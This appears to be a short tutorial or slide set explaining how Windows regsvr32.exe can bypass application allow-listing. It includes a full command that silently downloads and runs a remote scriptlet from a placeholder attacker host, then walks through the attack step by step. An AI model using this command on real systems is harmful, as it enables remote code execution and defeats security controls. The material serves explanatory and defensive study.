Abusing `regsvr32.exe` for Code Execution

Registering Malicious Scriptlets

regsvr32 /s /u /n /i:http://evil.com/file.sct scrobj.dll
Command Explained

`regsvr32` is a Windows utility for DLL registration. Here, it's used to download and execute a remote scriptlet.

`/i:URL` Parameter

Crucially, this specifies a URL to a scriptlet file (`.sct`) that `regsvr32` will download and execute via `scrobj.dll`.

Silent Execution

`/s` (silent mode) and `/u` (unregister) help to make the execution less conspicuous, though `/u` is often a red herring.

Key Takeaway

`regsvr32` is a powerful LOLBAS because it's whitelisted and can fetch/execute arbitrary code from remote sources, bypassing AWL.

How `regsvr32` Bypass Works

1.

Attacker hosts malicious `.sct` file on a web server.

2.

Victim executes `regsvr32` command with `/i:URL` pointing to `.sct`.

3.

`regsvr32` downloads the `.sct` file.

4.

`scrobj.dll` processes and executes the script within the `.sct` file.

Common Misconception

The `/u` flag doesn't mean it's harmless. It just tells `regsvr32` to unregister, but the scriptlet execution still occurs during the process.
